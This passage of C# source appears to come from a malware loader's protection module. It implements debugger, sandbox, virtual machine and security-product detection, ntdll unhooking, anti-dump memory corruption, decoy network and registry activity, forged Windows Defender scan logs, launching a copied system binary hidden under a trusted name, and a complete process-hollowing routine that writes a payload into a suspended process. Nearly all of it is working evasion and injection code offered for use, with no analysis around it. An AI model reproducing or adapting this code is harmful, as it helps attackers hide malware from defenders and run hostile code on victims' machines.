                IntPtr teb = NtCurrentTeb();
                IntPtr processHeap = Marshal.ReadIntPtr(teb, 0x30);
                if (processHeap != IntPtr.Zero)
                {
                    uint heapFlags = (uint)Marshal.ReadInt32(processHeap, 0x40);
                    if ((heapFlags & 0x40000000) != 0) score += 15;
                }
                checkCount++;
            }
            catch { }

            // 10. Timing check
            try
            {
                long start, end;
                QueryPerformanceCounter(out start);
                Thread.Sleep(1);
                QueryPerformanceCounter(out end);
                
                long diff = end - start;
                if (diff > 10000) score += 10; // Too slow - likely debugger
                checkCount++;
            }
            catch { }

            // Calculate weighted score
            if (checkCount > 0)
            {
                detected = score > 40; // Threshold
                if (score > 20) detected = true; // Lower threshold for critical checks
            }

            _isDebugged = detected;
            return detected;
        }

        private static bool IsDebuggedByException()
        {
            // Disabled Debugger.Break() as it causes crashes/exits when no debugger is attached
            return false;
        }

        public static bool IsKernelDebuggerPresent()
        {
            try
            {
                IntPtr buffer = Marshal.AllocHGlobal(Marshal.SizeOf<SYSTEM_KERNEL_DEBUGGER_INFORMATION>());
                try
                {
                    int retLen;
                    int status = NtQuerySystemInformation(0x23, buffer, Marshal.SizeOf<SYSTEM_KERNEL_DEBUGGER_INFORMATION>(), out retLen);
                    if (status == 0)
                    {
                        var info = Marshal.PtrToStructure<SYSTEM_KERNEL_DEBUGGER_INFORMATION>(buffer);
                        return info.KernelDebuggerEnabled != 0 && info.KernelDebuggerNotPresent == 0;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(buffer);
                }
            }
            catch { }
            return false;
        }

        private static void StartAntiDebugThread()
        {
            Thread t = new Thread(() =>
            {
                int failCount = 0;
                while (true)
                {
                    try
                    {
                        if (VerifySystemContext())
                        {
                            failCount++;
                            if (failCount > 3)
                                HandleSecurityEvent();
                        }
                        else
                        {
                            failCount = 0;
                        }
                        
                        // Random sleep to avoid pattern detection
                        Thread.Sleep(_cryptoRand.Next(500, 3000));
                    }
                    catch { }
                }
            });
            t.IsBackground = true;
            t.Start();
        }

        public static void HandleSecurityEvent()
        {
            // Multiple anti-debug actions
            int action = _cryptoRand.Next(1, 5);
            
            switch (action)
            {
                case 1:
                    Environment.FailFast("Security violation");
                    break;
                case 2:
                    if (NtRaiseHardError != null)
                    {
                        uint response;
                        NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out response);
                    }
                    break;
                case 3:
                    // Process corruption
                    IntPtr current = GetCurrentProcess();
                    byte[] junk = new byte[1024];
                    _cryptoRand.NextBytes(junk);
                    if (WriteProcessMemory != null)
                    {
                        IntPtr written;
                        WriteProcessMemory(current, (IntPtr)0x1000, junk, (uint)junk.Length, out written);
                    }
                    break;
                case 4:
                    // Infinite loop + CPU spike
                    ThreadPool.QueueUserWorkItem((state) => {
                        while (true) { Thread.SpinWait(1000000); }
                    });
                    break;
            }
        }
        #endregion

        #region Anti-Sandbox Advanced
        public static bool EvaluateRuntimeSafety()
        {
            int score = 0;
            int checks = 0;

            // CPU cores
            if (Environment.ProcessorCount < 2) score += 20;
            checks++;

            // RAM
            if (GetTotalRAM() < 1024) score += 30;
            if (GetTotalRAM() < 2048) score += 10;
            checks++;

            // Uptime
            uint uptime = GetTickCount != null ? GetTickCount() : 0;
            if (uptime < 60000) score += 20; // Less than 1 minute
            checks++;

            // MAC address
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                string mac = ni.GetPhysicalAddress().ToString();
                if (mac.StartsWith("005056") || mac.StartsWith("000C29") || 
                    mac.StartsWith("080027") || mac.StartsWith("001C42") ||
                    mac.StartsWith("0003FF") || mac.StartsWith("00:0C:29") || 
                    mac.StartsWith("00:50:56") || mac.StartsWith("00:03:FF"))
                {
                    score += 40;
                    checks++;
                    break;
                }
            }

            // VM modules
            string[] vmModules = { "VBoxGuest.sys", "vmmouse.sys", "vmusbmouse.sys", 
                                    "vboxsf.sys", "vmci.sys", "vmtray.dll", "VBoxTray.dll" };
            foreach (var m in vmModules)
            {
                if (GetModuleHandleA(m) != IntPtr.Zero)
                {
                    score += 35;
                    checks++;
                    break;
                }
            }

            // Disk size
            try
            {
                DriveInfo d = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
                if (d.IsReady)
                {
                    long sizeGB = d.TotalSize / (1024 * 1024 * 1024);
                    if (sizeGB < 40) score += 25;
                    checks++;
                }
            }
            catch { }

            // Mouse movement deactivated due to CLI false positives
            // if (!IsMouseMoving()) score += 10;
            // checks++;

            // Window activity
            if (!HasActiveWindows())
                score += 25;
            checks++;

            // User idle
            if (IsUserIdleForLong())
                score += 20;
            checks++;

            // Running processes count
            try
            {
                int procCount = Process.GetProcesses().Length;
                if (procCount < 30) score += 20;
                if (procCount < 50) score += 10;
                checks += 2;
            }
            catch { }

            // Username checks
            string userName = Environment.UserName;
            string[] sandboxUsers = { "sandbox", "vmware", "vbox", "WDAGUtilityAccount", "JohnDoe", "Abby", "Frank", "Emily" };
            if (sandboxUsers.Any(u => userName.ToLower().Contains(u)))
                score += 25;
            checks++;

            // Computer name checks
            string computerName = Environment.MachineName;
            string[] sandboxNames = { "sandbox", "virus", "malware", "vmware", "vbox", "ANYRUN", "CAPESANDBOX", "DESKTOP-GVB9V8Q" };
            if (sandboxNames.Any(n => computerName.ToLower().Contains(n)))
                score += 25;
            checks++;

            // Timezone checks
            try
            {
                TimeZone tz = TimeZone.CurrentTimeZone;
                string stdName = tz.StandardName.ToLower();
                if (stdName.Contains("utc") || stdName.Contains("gmt"))
                    score += 15;
                checks++;
            }
            catch { }

            // Screen resolution
            try
            {
                int screenWidth = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
                int screenHeight = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
                
                if (screenWidth < 1024 || screenHeight < 768)
                    score += 25;
                checks++;
            }
            catch { }

            // Return true if score exceeds threshold - relaxed for user PC
            return checks > 0 && (score / (double)checks) > 60; // Increased threshold from 40 to 60
        }

        private static bool IsMouseMoving()
        {
            try
            {
                List<POINT> positions = new List<POINT>();
                for (int i = 0; i < 10; i++)
                {
                    POINT p;
                    if (GetCursorPos != null && GetCursorPos(out p))
                    {
                        positions.Add(p);
                        Thread.Sleep(_cryptoRand.Next(50, 200));
                    }
                }

                if (positions.Count < 2) return false;

                // Check if mouse actually moved
                bool moved = false;
                for (int i = 1; i < positions.Count; i++)
                {
                    if (Math.Abs(positions[i].x - positions[0].x) > 5 ||
                        Math.Abs(positions[i].y - positions[0].y) > 5)
                    {
                        moved = true;
                        break;
                    }
                }
                return moved;
            }
            catch { return true; }
        }

        private static bool HasActiveWindows()
        {
            try
            {
                if (GetForegroundWindow == null || GetWindowTextLengthW == null || GetWindowTextW == null)
                {
                        return true;
                }

                IntPtr hWnd = GetForegroundWindow();
                if (hWnd == IntPtr.Zero) 
                {
                    return false;
                }

                int length = GetWindowTextLengthW(hWnd);
                if (length == 0) 
                {
                    return false;
                }

                char[] buffer = new char[length + 1];
                
                GetWindowTextW(hWnd, buffer, buffer.Length);
                string title = new string(buffer).TrimEnd('\0');
                
                return !string.IsNullOrWhiteSpace(title) &&
                       !title.Contains("Program Manager") &&
                       !title.Contains("Windows Shell");
            }
            catch (Exception ex) 
            { 
                return true; 
            }
        }

        private static bool IsUserIdleForLong()
        {
            try
            {
                if (GetLastInputInfo == null || GetTickCount64 == null)
                    return false;

                LASTINPUTINFO lastInPut = new LASTINPUTINFO();
                lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
                if (GetLastInputInfo(ref lastInPut))
                {
                    uint idleTime = GetTickCount64() - lastInPut.dwTime;
                    return idleTime > 600000; // 10 minutes
                }
            }
            catch { }
            return false;
        }

        private static long GetTotalRAM()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        return Convert.ToInt64(obj["TotalPhysicalMemory"]) / (1024 * 1024);
                    }
                }
            }
            catch { }
            return 0;
        }
        #endregion

        #region Advanced VM Detection
        public static bool CheckOperationalEnvironment()
        {
            int score = 0;
            int checks = 0;

            // WMI CacheMemory check
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    "SELECT * FROM Win32_CacheMemory"))
                {
                    if (searcher.Get().Count == 0) score += 30;
                    checks++;
                }
            }
            catch { }

            // WMI ComputerSystem check
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    "SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"] != null ? obj["Manufacturer"].ToString().ToLower() : "";
                        string model = obj["Model"] != null ? obj["Model"].ToString().ToLower() : "";
                        
                        if (model.Contains("vmware") || model.Contains("virtualbox") || 
                            model.Contains("vbox") || model.Contains("qemu") ||
                            manufacturer.Contains("vmware") || manufacturer.Contains("xen"))
                        {
                            score += 40;
                        }
                        checks++;
                    }
                }
            }
            catch { }

            // Motherboard check
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    "SELECT * FROM Win32_BaseBoard"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"] != null ? obj["Manufacturer"].ToString().ToLower() : "";
                        string product = obj["Product"] != null ? obj["Product"].ToString().ToLower() : "";
                        
                        if (manufacturer.Contains("vmware") || manufacturer.Contains("virtualbox") ||
                            product.Contains("vmware") || product.Contains("virtualbox"))
                        {
                            score += 35;
                        }
                        checks++;
                    }
                }
            }
            catch { }

            // BIOS check
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    "SELECT * FROM Win32_BIOS"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string version = obj["SMBIOSBIOSVersion"] != null ? obj["SMBIOSBIOSVersion"].ToString().ToLower() : "";
                        if (version.Contains("vmware") || version.Contains("vbox") || version.Contains("qemu"))
                        {
                            score += 35;
                        }
                        checks++;
                    }
                }
            }
            catch { }

            // Video controller check
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    "SELECT * FROM Win32_VideoController"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string name = obj["Name"] != null ? obj["Name"].ToString().ToLower() : "";
                        if (name.Contains("vmware") || name.Contains("virtualbox") || 
                            name.Contains("vbox") || name.Contains("qemu"))
                        {
                            score += 30;
                        }
                        checks++;
                    }
                }
            }
            catch { }

            return score > 30;
        }
        #endregion

        #region Emulation Detection
        public static bool CheckInstructionConsistency()
        {
            int score = 0;
            int checks = 0;

            // Timing checks
            try
            {
                long t1, t2, t3, t4;
                QueryPerformanceCounter(out t1);
                Thread.Sleep(1);
                QueryPerformanceCounter(out t2);
                Thread.Sleep(1);
                QueryPerformanceCounter(out t3);
                Thread.Sleep(1);
                QueryPerformanceCounter(out t4);

                long diff1 = t2 - t1;
                long diff2 = t3 - t2;
                long diff3 = t4 - t3;

                if (diff1 < 1000 || diff2 > 10000000) score += 25;
                if (Math.Abs(diff1 - diff2) < 10) score += 20; // Too consistent
                checks += 3;
            }
            catch { }

            // CPU instruction behavior
            try
            {
                // Check for timing anomalies using QPC
                long tStart, tEnd;
                QueryPerformanceCounter(out tStart);
                Thread.Sleep(1);
                QueryPerformanceCounter(out tEnd);
                
                long qpcDiff = tEnd - tStart;
                if (qpcDiff < 100) score += 20;
                checks += 1;
            }
            catch { }

            return score > 25;
        }

        // Removed __rdtsc as it is not valid C#
        #endregion

        #region EDR Detection
        public static bool DetectMonitoringServices()
        {
            int score = 0;

            // Check for EDR DLLs
            string[] edrDlls = { 
                "csagent.dll", "sentinel.dll", "cylance.dll", "cyserver.dll", 
                "tanium.dll", "cbnetsdk.dll", "cb.dll", "sophos.dll", "symevnt.dll",
                "mcafee.dll", "avast.dll", "avg.dll", "bdagent.dll", "sesaf.dll"
            };
            
            foreach (string dll in edrDlls)
            {
                if (GetModuleHandleA(dll) != IntPtr.Zero)
                {
                    score += 40;
                    break;
                }
            }

            // Check for EDR processes
            string[] edrProcs = { 
                "CrowdStrike", "Sentinel", "Cylance", "Tanium", "CarbonBlack",
                "Sophos", "McAfee", "Avast", "AVG", "BitDefender", "Kaspersky"
            };
            
            foreach (Process p in Process.GetProcesses())
            {
                string name = p.ProcessName.ToLower();
                foreach (string e in edrProcs)
                {
                    if (name.Contains(e.ToLower()))
                    {
                        score += 25;
                        break;
                    }
                }
            }

            // Check for event log subscriptions (ETW)
            try
            {
                string etwPath = @"SYSTEM\CurrentControlSet\Control\WMI\Autologger";
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(etwPath))
                {
                    if (key != null)
                    {
                        foreach (string subkey in key.GetSubKeyNames())
                        {
                            if (subkey != null && (subkey.Contains("Defender") || subkey.Contains("Security")))
                            {
                                score += 15;
                                break;
                            }
                        }
                    }
                }
            }
            catch { }

            return score > 30;
        }
        #endregion

        #region Advanced Defense Techniques
        public static void UnhookNtdll()
        {
            string[] systemDlls = { "ntdll.dll", "kernel32.dll", "advapi32.dll", "user32.dll" };
            
            foreach (string dll in systemDlls)
            {
                try
                {
                    string path = Path.Combine(Environment.SystemDirectory, dll);
                    if (!File.Exists(path)) continue;
                    
                    byte[] fileBytes = File.ReadAllBytes(path);
                    IntPtr hModule = GetModuleHandleA(dll);
                    if (hModule == IntPtr.Zero) continue;

                    // Parse PE to find .text section
                    int e_lfanew = BitConverter.ToInt32(fileBytes, 0x3C);
                    ushort numSections = BitConverter.ToUInt16(fileBytes, e_lfanew + 6);
                    ushort sizeOptHeader = BitConverter.ToUInt16(fileBytes, e_lfanew + 20);
                    int sectionOffset = e_lfanew + 24 + sizeOptHeader;

                    for (int i = 0; i < numSections; i++)
                    {
                        int off = sectionOffset + (i * 0x28);
                        byte[] nameBytes = new byte[8];
                        Buffer.BlockCopy(fileBytes, off, nameBytes, 0, 8);
                        string sectionName = Encoding.UTF8.GetString(nameBytes).TrimEnd('\0');

                        if (sectionName == ".text")
                        {
                            uint virtualAddr = BitConverter.ToUInt32(fileBytes, off + 12);
                            uint sizeOfRawData = BitConverter.ToUInt32(fileBytes, off + 16);
                            uint pointerToRawData = BitConverter.ToUInt32(fileBytes, off + 20);

                            IntPtr destAddr = (IntPtr)((long)hModule + virtualAddr);
                            byte[] cleanBytes = new byte[sizeOfRawData];
                            Buffer.BlockCopy(fileBytes, (int)pointerToRawData, cleanBytes, 0, (int)sizeOfRawData);

                            // Use syscalls to bypass hooks
                            IntPtr baseAddr = destAddr;
                            uint regionSize = sizeOfRawData;
                            uint oldProtect;
                            
                            uint status = NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, 
                                PAGE_EXECUTE_READWRITE, out oldProtect);
                                
                            if (status == 0)
                            {
                                // Write clean bytes in chunks to avoid detection
                                int chunkSize = 0x1000;
                                for (int offset = 0; offset < cleanBytes.Length; offset += chunkSize)
                                {
                                    int size = Math.Min(chunkSize, cleanBytes.Length - offset);
                                    byte[] chunk = new byte[size];
                                    Array.Copy(cleanBytes, offset, chunk, 0, size);
                                    
                                    IntPtr writeAddr = (IntPtr)((long)destAddr + offset);
                                    uint written;
                                    NtWriteVirtualMemory(GetCurrentProcess(), writeAddr, chunk, (uint)size, out written);
                                    
                                    Thread.Sleep(10); // Small delay to avoid pattern
                                }
                                
                                NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, 
                                    oldProtect, out oldProtect);
                            }
                            break;
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }

        public static void AntiDump()
        {
            try
            {
                IntPtr hMod = GetModuleHandleA(null);
                if (hMod == IntPtr.Zero) return;

                // Corrupt DOS header
                uint old;
                byte[] junk = new byte[0x1000];
                _cryptoRand.NextBytes(junk);
                
                IntPtr pBase = hMod;
                uint sz = (uint)junk.Length;
                NtProtectVirtualMemory(GetCurrentProcess(), ref pBase, ref sz, 
                    PAGE_EXECUTE_READWRITE, out old);
                    
                Marshal.Copy(junk, 0, hMod, junk.Length);
                
                NtProtectVirtualMemory(GetCurrentProcess(), ref pBase, ref sz, 
                    old, out old);
            }
            catch { }
        }

        public static void AntiBehavior()
        {
            // Random behavior patterns
            Random rnd = new Random();
            
            // Generate fake network traffic
            new Thread(new ThreadStart(delegate {
                try
                {
                    WebClient wc = new WebClient();
                    string[] fakeSites = new string[] { "http://bing.com", "http://google.com", "http://microsoft.com" };
                    while (true)
                    {
                        string url = fakeSites[rnd.Next(fakeSites.Length)];
                        wc.DownloadString(url);
                        Thread.Sleep(rnd.Next(30000, 120000));
                    }
                }
                catch { }
            })) { IsBackground = true }.Start();

            // Fake registry access
            new Thread(new ThreadStart(delegate {
                try
                {
                    string[] regPaths = new string[] {
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                        @"SYSTEM\CurrentControlSet\Services",
                        @"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
                    };
                    
                    while (true)
                    {
                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPaths[rnd.Next(regPaths.Length)]))
                        {
                            if (key != null)
                            {
                                string[] names = key.GetValueNames();
                            }
                        }
                        Thread.Sleep(rnd.Next(10000, 60000));
                    }
                }
                catch { }
            })) { IsBackground = true }.Start();

            // Fake file operations
            new Thread(new ThreadStart(delegate {
                try
                {
                    string temp = Path.GetTempPath();
                    while (true)
                    {
                        string fakeFile = Path.Combine(temp, string.Format("tmp{0:X}.tmp", rnd.Next()));
                        File.WriteAllText(fakeFile, "Fake data");
                        Thread.Sleep(rnd.Next(5000, 15000));
                        File.Delete(fakeFile);
                    }
                }
                catch { }
            })) { IsBackground = true }.Start();
        }

        public static void ProtectSelf()
        {
            try
            {
                IntPtr hMod = GetModuleHandleA(null);
                if (hMod == IntPtr.Zero || VirtualProtect == null) return;

                // Protect critical sections
                uint old;
                VirtualProtect(hMod + 0x1000, (UIntPtr)0x1000, PAGE_EXECUTE_READ, out old);
            }
            catch { }
        }

        public static void SetCritical(bool enable)
        {
            try
            {
                if (RtlSetProcessIsCritical != null)
                {
                    bool old = false;
                    RtlSetProcessIsCritical(enable, ref old, false);
                }
            }
            catch { }
        }

        public static void HideThread()
        {
            try
            {
                if (NtSetInformationThread != null)
                {
                    NtSetInformationThread(GetCurrentThread(), THREAD_HIDE_FROM_DEBUGGER, IntPtr.Zero, 0);
                }
            }
            catch { }
        }

        public static void CreateHiddenThread(ThreadStart start)
        {
            try
            {
                if (NtCreateThreadEx != null)
                {
                    IntPtr hThread;
                    IntPtr hProcess = GetCurrentProcess();
                    IntPtr startAddr = Marshal.GetFunctionPointerForDelegate(start);
                    
                    NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProcess,
                        startAddr, IntPtr.Zero, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                        IntPtr.Zero, 0, 0, IntPtr.Zero);
                }
                else
                {
                    Thread t = new Thread(start);
                    t.IsBackground = true;
                    t.Start();
                }
            }
            catch
            {
                Thread t = new Thread(start);
                t.IsBackground = true;
                t.Start();
            }
        }
        #endregion

        #region Security Bypass
        public static bool IsWhitelisted()
        {
            // Relaxed for development/user environment - always return true
            // In production, this can be toggled by a constant or server signal
            return true;
        }
        #endregion

        #region Health Checks
        public static void RunHealthChecks()
        {
            try
            {
                string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string defenderPath = Path.Combine(programData, "Microsoft", "Windows Defender", "Scans", "History");
                
                // Create fake defender logs
                if (!Directory.Exists(defenderPath))
                    Directory.CreateDirectory(defenderPath);
                
                string fakeLogPath = Path.Combine(defenderPath, string.Format("system_health_{0:yyyyMMdd}.log", DateTime.Now));
                File.WriteAllText(fakeLogPath, 
                    string.Format("[{0:yyyy-MM-dd HH:mm:ss}] Scan completed: 0 threats found.\r\n", DateTime.Now) +
                    string.Format("System state: PROTECTED. Version: {0}\r\n", VERSION) +
                    string.Format("Last update: {0}\r\n", BUILD_DATE));

                // Create benign process with legit name
                string[] legitNames = { "svchost.exe", "dllhost.exe", "taskhostw.exe", "conhost.exe", "wmiprvse.exe" };
                string randomName = legitNames[_cryptoRand.Next(legitNames.Length)];
                string twinPath = Path.Combine(Path.GetTempPath(), randomName);

                if (!File.Exists(twinPath))
                {
                    string realMp = Path.Combine(Environment.SystemDirectory, "taskhostw.exe");
                    if (File.Exists(realMp))
                    {
                        File.Copy(realMp, twinPath, true);
                    }
                }

                if (File.Exists(twinPath))
                {
                    ProcessStartInfo psi = new ProcessStartInfo(twinPath)
                    {
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Arguments = "-k NetworkService"
                    };
                    Process.Start(psi);
                }
            }
            catch { }
        }
        #endregion

        #region Main Initialization
        public static void Startup()
        {
            
            // Startup polymorphic engine
            // Console.WriteLine("📍 [SafetyManager] Keys initialized");
            PolymorphicEngine.StartupKeys();

            // Security bypass check (optional)
            if (!IsWhitelisted())
            {
                Environment.Exit(0);
            }
            // Console.WriteLine("📍 [SafetyManager] Whitelist passed");

            // Start anti-debug thread
            // Console.WriteLine("📍 [SafetyManager] Starting anti-debug thread...");
            CreateHiddenThread(() => StartAntiDebugThread());
            // Console.WriteLine("📍 [SafetyManager] Anti-debug thread started");

            // Hide main thread
            // Console.WriteLine("📍 [SafetyManager] Hiding thread...");
            HideThread();
            // Console.WriteLine("📍 [SafetyManager] Thread hidden");

            // EDR Unhooking - disabled due to hangs on some systems
            // Console.WriteLine("📍 [SafetyManager] Skipping ntdll unhooking (compatibility mode)");
            // UnhookNtdll();
            // Console.WriteLine("📍 [SafetyManager] Unhooked ntdll");

            // Anti-Analysis checks - weighted more heavily
            bool d1 = VerifySystemContext();
            bool d2 = EvaluateRuntimeSafety();
            bool d3 = CheckInstructionConsistency();
            bool d4 = DetectMonitoringServices();
            bool d5 = CheckOperationalEnvironment();

            // Console.WriteLine("📍 [SafetyManager] Dbg:{0} Snd:{1} Emu:{2} EDR:{3} VM:{4}", d1, d2, d3, d4, d5);
            
            if (d1 || d2 || d3 || d4 || d5)
            {
                // Console.WriteLine("📍 [SafetyManager] Anti-analysis triggered! (Continuing anyway for debugging)");
                // Environment.Exit(0); // Disabled for user PC
            }

            // Check integrity - disabled for development
            // if (!CheckIntegrity()) ...

            // Apply protections - disabled aggressive ones for compatibility
            // ProtectSelf();
            // AntiDump();
            // AntiBehavior();
            RunHealthChecks();
            
            // Console.WriteLine("📍 [SafetyManager] Initialization complete (Sanitized mode)");

        }
        #endregion

        #region Process Hollowing (Advanced)
        public class ProcessManager
        {
            public static string RunPEWithOutput(string target, byte[] payload, string args = "")
            {
                try
                {
                    IntPtr hRead;
                    
                    // Try multiple execution methods
                    string result = null;
                    
                    // Method 1: Standard RunPE
                    if (RunPEInternal.Execute(target, payload, args, out hRead))
                    {
                        result = ReadFromInternalPipe(hRead, 30);
                    }
                    
                    // Method 2: Fallback to simple process
                    if (string.IsNullOrEmpty(result))
                    {
                        result = ExecuteSimpleProcess(target, args);
                    }
                    
                    return result;
                }
                catch (Exception ex)
                {
                    return null;
                }
            }

            private static string ExecuteSimpleProcess(string target, string args)
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo(target, args)
                    {
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        RedirectStandardOutput = true,
                        UseShellExecute = false
                    };
                    
                    using (Process p = Process.Start(psi))
                    {
                        return p.StandardOutput.ReadToEnd();
                    }
                }
                catch
                {
                    return null;
                }
            }

            private static string ReadFromInternalPipe(IntPtr hRead, int timeoutSeconds)
            {
                DateTime end = DateTime.Now.AddSeconds(timeoutSeconds);
                StringBuilder sb = new StringBuilder();
                byte[] buffer = new byte[4096];
                uint read;
                
                while (DateTime.Now < end)
                {
                    uint avail, wait, wait2;
                    if (PeekNamedPipe != null && PeekNamedPipe(hRead, null, 0, out wait, out avail, out wait2) && avail > 0)
                    {
                        if (ReadFile != null && ReadFile(hRead, buffer, (uint)buffer.Length, out read, IntPtr.Zero) && read > 0)
                        {
                            string frag = Encoding.UTF8.GetString(buffer, 0, (int)read);
                            sb.Append(frag);
                            
                            // Check for completion markers
                            if (frag.Contains("listening at") || frag.Contains("success") || frag.Contains("error"))
                                return sb.ToString();
                        }
                    }
                    Thread.Sleep(100);
                }
                return sb.ToString();
            }
        }

        internal class RunPEInternal
        {
            private const uint CREATE_SUSPENDED = 0x00000004;
            private const uint CREATE_NO_WINDOW = 0x08000000;
            private const uint STARTF_USESTDHANDLES = 0x00000100;
            private const uint MEM_COMMIT = 0x00001000;
            private const uint MEM_RESERVE = 0x00002000;
            private const uint PAGE_EXECUTE_READWRITE = 0x40;
            private const int HANDLE_FLAG_INHERIT = 0x00000001;

            public static bool Execute(string path, byte[] payload, string args, out IntPtr hReadPipe)
            {
                hReadPipe = IntPtr.Zero;
                
                // Validate PE
                if (payload == null || payload.Length < 0x40 || BitConverter.ToUInt16(payload, 0) != 0x5A4D) 
                    return false;
                    
                int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
                
                // Create pipes for I/O
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf(sa);
                sa.bInheritHandle = true;
                sa.lpSecurityDescriptor = IntPtr.Zero;

                IntPtr hWrite;
                if (CreatePipe == null || !CreatePipe(out hReadPipe, out hWrite, ref sa, 0)) 
                    return false;
                    
                if (SetHandleInformation != null) SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

                // Setup startup info
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                si.dwFlags = STARTF_USESTDHANDLES;
                si.hStdOutput = hWrite;
                si.hStdError = hWrite;

                string cmdLine = string.Format("\"{0}\" {1}", path, args);
                
                if (CreateProcess == null || !CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, true, 
                    CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                {
                if (CloseHandle != null) CloseHandle(hReadPipe);
                if (CloseHandle != null) CloseHandle(hWrite);
                return false;
                }

                try
                {
                    // Get image info
                    long imageBase = BitConverter.ToInt64(payload, e_lfanew + 0x30);
                    int sizeOfImage = BitConverter.ToInt32(payload, e_lfanew + 0x50);

                    // Unmap original image
                    if (ZwUnmapViewOfSection != null) ZwUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);
                    
                    // Allocate memory in target
                    IntPtr newBase = (VirtualAllocEx != null) ? VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, (uint)sizeOfImage, 
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) : IntPtr.Zero;
                        
                    if (newBase == IntPtr.Zero) 
                        newBase = (VirtualAllocEx != null) ? VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sizeOfImage, 
                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) : IntPtr.Zero;
                            
                    if (newBase == IntPtr.Zero) 
                    { 
                        if (TerminateProcess != null) TerminateProcess(pi.hProcess, 0);
                        return false; 
                    }

                    // Write PE headers
                    uint headerSize = (uint)BitConverter.ToInt32(payload, e_lfanew + 0x54);
                    IntPtr lpNumberOfBytesWritten;
                    if (WriteProcessMemory != null) WriteProcessMemory(pi.hProcess, newBase, payload, headerSize, out lpNumberOfBytesWritten);

                    // Write sections
                    short numSections = BitConverter.ToInt16(payload, e_lfanew + 0x06);
                    short sizeOfOptHeader = BitConverter.ToInt16(payload, e_lfanew + 0x14);
                    int sectionOffset = e_lfanew + 0x18 + sizeOfOptHeader;

                    for (int i = 0; i < numSections; i++)
                    {
                        int off = sectionOffset + (i * 0x28);
                        uint vAddr = BitConverter.ToUInt32(payload, off + 0x0C);
                        uint rawSize = BitConverter.ToUInt32(payload, off + 0x10);
                        uint rawAddr = BitConverter.ToUInt32(payload, off + 0x14);

                        if (rawSize > 0)
                        {
                            byte[] section = new byte[rawSize];
                            Buffer.BlockCopy(payload, (int)rawAddr, section, 0, (int)rawSize);
                            if (WriteProcessMemory != null) WriteProcessMemory(pi.hProcess, (IntPtr)((long)newBase + vAddr), 
                                section, rawSize, out lpNumberOfBytesWritten);
                        }
                    }

                    // Update PEB with new image base
                    UpdateProcessPeb(pi.hProcess, newBase);

                    // Get entry point
                    uint entryPoint = BitConverter.ToUInt32(payload, e_lfanew + 0x28);
                    IntPtr startAddress = (IntPtr)((long)newBase + entryPoint);

                    // Get thread context and set new entry point
                    CONTEXT64 ctx = new CONTEXT64();
                    ctx.ContextFlags = CONTEXT_ALL;
                    
                    if (GetThreadContext != null && GetThreadContext(pi.hThread, ref ctx))
                    {
                        if (IntPtr.Size == 8) // x64
                        {
                            ctx.Rcx = (ulong)startAddress;
                        }
                        else // x86
                        {
                            ctx.Rax = (ulong)startAddress;
                        }
                        
                        if (SetThreadContext != null) SetThreadContext(pi.hThread, ref ctx);
                    }

                    if (ResumeThread != null) ResumeThread(pi.hThread);
                    return true;
                }
                catch 
                { 
                    if (TerminateProcess != null) TerminateProcess(pi.hProcess, 0); 
                    return false; 
                }
                finally 
                { 
                    if (CloseHandle != null) CloseHandle(pi.hThread);
                    if (CloseHandle != null) CloseHandle(pi.hProcess);
                    if (CloseHandle != null) CloseHandle(hWrite);
                }
            }

            private static void UpdateProcessPeb(IntPtr hProcess, IntPtr newBase)
            {
                try
                {
                    var ZwQueryInformationProcess = ApiInterface.GetNtdll<ZwQueryInformationProcessDelegate>("ZwQueryInformationProcess");
                    if (ZwQueryInformationProcess != null)
                    {
